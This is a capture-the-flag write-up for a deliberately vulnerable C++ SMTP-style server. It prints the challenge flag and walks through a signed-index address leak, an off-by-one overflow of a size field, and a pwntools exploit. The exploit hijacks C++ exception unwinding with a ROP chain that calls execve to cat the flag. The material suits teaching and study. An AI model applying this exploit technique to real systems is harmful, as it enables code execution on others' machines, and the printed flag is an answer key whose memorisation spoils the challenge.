# jantofix_mailserv
i made a halfass smtp server, cpp rocks (i hate myself)

**FLAG** : ODESSEY{j4n70f1x_z4m70f1x_y4r3b1_54l4m4}

## writeup
### code analysis
The app is essentially the backend of an [SMTP](https://datatracker.ietf.org/doc/html/rfc5321) server, where users are permitted to input SMTP commands, and the server executes them on their behalf.  

### Commands

- `HELO | EHLO`       Checks the connection with the app, similar to a ping.
- `NOOP`              Does the same thing but with a different message.
- `QUIT`              Displays a message and quits.
- `AUTH <fname> <lname> <pass> <ehandle>` Registers a user.
- `RSET`              Clears the buffer of the current email.
- `VRFY <user_id>`    Checks if the user exists.
- `MAIL FROM <sender>` Sets the current email sender.  
- `RCPT TO <rcv>`     Sets the current email receiver.  
- `DATA`              Sets the email data.  

Before accessing the code, it would be better to be familiar with our data structures.  

`srv_exception` is a derived class from `std::exception` that literally does nothing except returning a message as a `char *`.  

```cpp
class srv_exception : public std::exception {
	private:
		std::string message;

	public:
		srv_exception(const char* msg): message(msg){}
		const char* what() const throw() {
			return message.c_str();
		}
};
```

`Mail` is a class that holds the content of an email, including the sender, receiver, and other relevant information. The `data` array and `dsize` will be important later.

```cpp
class Mail {
	public :
		std::string	sender;
		std::string	receiver;
		char		data[1024];
		uint16_t	dsize = 1024;
		bool		sent = false;
};
```

`users_c` is a users id counter
```c
uint64_t		users_c = 0;
```

`User` is the base class of the program, which holds all the information related to a user. We won’t be needing it for exploitation, but it’s useful to understand how to interact with it.  

```cpp
class User {
	public :
		uint64_t		id = 0;
		std::string		fname;
		std::string		lname;
		std::string		password;
		std::string		email_handle;
		std::vector<Mail>	inbox;
		User(std::string fname,std::string lname, std::string password, std::string email_handle){
			this->fname = fname;
			this->lname = lname;
			this->password = password;
			this->email_handle = email_handle;
			this->id = users_c;
		}
};
```


Finally, we have two last variables: a list of users and the `current_mail`. The app is only capable of holding one mail per interaction.  

Now, back to the code analysis. I’ll focus only on the functions and parts that are relevant for our exploit.  

#### AUTH

`create_user` is a function that allocates and creates a new `User` class and inserts it into the `users` array. This function won't hold significant importance for our exploit, but it will be used to leverage other functionalities.

```c
void create_user(std::vector<std::string> splcmd){
	// syntax AUTH <fname> <lname> <password> <email_handle>
	if (splcmd.size() != 5){
		throw srv_exception("555 Bad syntax");
		return ;
	}
	if (users_c > 1000){
		throw srv_exception("555 max account limit is reached");
	}
	User *nuser = new User(splcmd[1], splcmd[2], splcmd[3], splcmd[4]);
	users[users_c] = nuser;
	users_c++;
	throw srv_exception("235 Ok");
}
```

#### VRFY

`verify_user` this function is very important to us, because of the unchecked signed indexing  
```c
		int8_t id = 0;
		if (splcmd[2] == "-s"){
			id = std::stoi(splcmd[3]);
			std::cout << "250 " << "EXIST " << users[id]->id << std::endl;
		}
```
this will be used to leak a lot of addresses

#### DATA
`mail_data`  the hero of our exploit. It essentially reads one extra byte from the user and copies it into the mail's buffer. This allows us to overwrite the `Mail.dsize` variable, enabling us to cause an overflow the next time it's used.  
```cpp
void mail_data(){
	char buffer[2048];
	if (current_mail.sender.empty() == false && current_mail.receiver.empty() == false){
		std::cout << "354 Continue" << std::endl;
		int stat = read(0, buffer, current_mail.dsize + 1);
		buffer[stat] = '\x00';
        ...
		throw srv_exception("360 Data is empty");
    }else {
		throw srv_exception("360 No receiver or sender");
	}
}
```

#### RSET
doesn't do much. It checks if `current_mail.dsize` equals 1024, and if so, it cleans the current mail. However, this function will be important later.
```cpp
void clean_mail(){
	try {
		if (current_mail.dsize != 1024)
			throw (srv_exception("Tampering with emails detected"));
        ...
	} catch(...) {
		current_mail.dsize = 1024;
	}

}
```

## exploit
Well, this seems like an easy challenge: overflow in `dsize`, then read another time to inject some gadget. The catch here is that `mail_data` never returns — it throws an error, which means our ROP chain will never execute.  

The inspiration for this challenge came from this [underrated paper](https://www.ndss-symposium.org/wp-content/uploads/2023/02/ndss2023_s295_paper.pdf). Give it a read because I'm neither willing nor able to explain exceptions in C++.  

**DISCLAIMER**: Be prepared to shed some tears if you're willing to read libcpp's source code.  

Let's start with leaking some addresses. Essentially, `VRFY` will only leak addresses from `.bss` and `.data` because of the size of the `id` [-127 -> 128], and it will dereference the address twice.  

```cpp
			id = std::stoi(splcmd[3]);
			std::cout << "250 " << "EXIST " << users[id]->id << std::endl;
```
Well, after a bit of fuzzing, we are able to leak the PIE base and libcpp addresses.
```py
    pp.sendline(b"VRFY id -s -6")
    libcpp_leak = int(pp.recvline().rstrip().split(b" ")[-1])
    libcpp.address = libcpp_leak - 2604064
    pp.sendline(b"VRFY id -s -92")
    elf.address = int(pp.recvline().rstrip().split(b" ")[-1]) - 45536
    log.info(f"libcpp leak {hex(libcpp_leak)}")
    log.info(f"piebase leak {hex(elf.address)}")
    log.info(f"libcpp base {hex(libcpp.address)}")
    log.info("logging in")
```

Now we need to overflow. The one byte extra in `read` will overflow into `Mail.dsize` and overflow the `buffer` the next time we read.
```c
        ...
		int stat = read(0, buffer, current_mail.dsize + 1);
        ...
		memcpy(current_mail.data, buffer, current_mail.dsize + 1);
        ...
```

```py
    a = auth("j", "z", "s", "l")
    b = auth("n", "n", "naaa", "n")
    log.info(f"users {a} {b} logged")
    log.info("overflowing")
    mailfrom(a)
    rcptto(b)
    data((b"\x00" * 1024) + b'\xff')
    data((b"\x00" * 1024 + b'f\x09'))            # making sure that we own dsize
```

So we know that we are never returning to our ROP chain, so the solution would be unwinding to another function, which will be `clean_mail` because it's the only one that has a try/catch statement.  

A cool thing I've read in the paper is **the golden gadget**, which is basically a LibCPP gadget that executes its parameter.  

```cpp
void __cxa_call_unexpected (void *exc_obj_in)
{
    /* ... */
    xh_terminate_handler = xh->terminateHandler; ª
    /* ... */
    __try
    { /* ... */ }
    __catch(... º)
    {
        /* ... */
        __terminate (xh_terminate_handler Ω);
    }
    /* ... */
}

void __terminate (std::terminate_handler handler)
    throw ()
    {
    __try
    {
        handler (); æ
        std::abort ();
    }
    __catch(...)
    { std::abort (); }
}
```


I tried it, but the alignment and parameters kept messing me up. I didn't bother looking for another golden gadget, so if you find another way, please DM me.  

Well, when jumping back to the unwind gadget, we have no functions that execute commands, and we don't have a libc leak, but we do have a libcpp leak, which, for the entire library, contains only one syscall and some gadgets. Neat.  

Constructing our gadget will be a pain in the ass because somehow stdin breaks after unwinding. So, the only solution I found is literally calling `execve` and loading `argv` with the `cat` command to cat the flag.  

```py
    offset = 2120
    unwind_gadget = elf.address + 17719
    syscall = 0x0000000000197bb4 + libcpp.address
    pop_rdx = 0x00000000001d68bb + libcpp.address
    pop_rdi = 0x00000000000f3d0d + libcpp.address
    pop_rsi = 0x00000000000e4506 + libcpp.address
    pop_rax = 0x00000000000dc7b0 + libcpp.address
    space = elf.address + 54528
    cmd = b"/bin/cat\x00cat\x00/app/flag.txt\x00"
    pay = flat (
            space + len("/bin/cat\x00") + (8 * 3),
            space + len("/bin/cat\x00cat\x00")+ (8 * 3),
            0,
            cmd,
            cyclic(offset - (len(cmd) + (8 * 3))),
            unwind_gadget,
            cyclic(88),
            pop_rdi, 
            space + (8*3) ,
            pop_rsi,
            space,
            pop_rax,
            59,
            pop_rdx,
            0,
            syscall

            )
    data(pay)
```
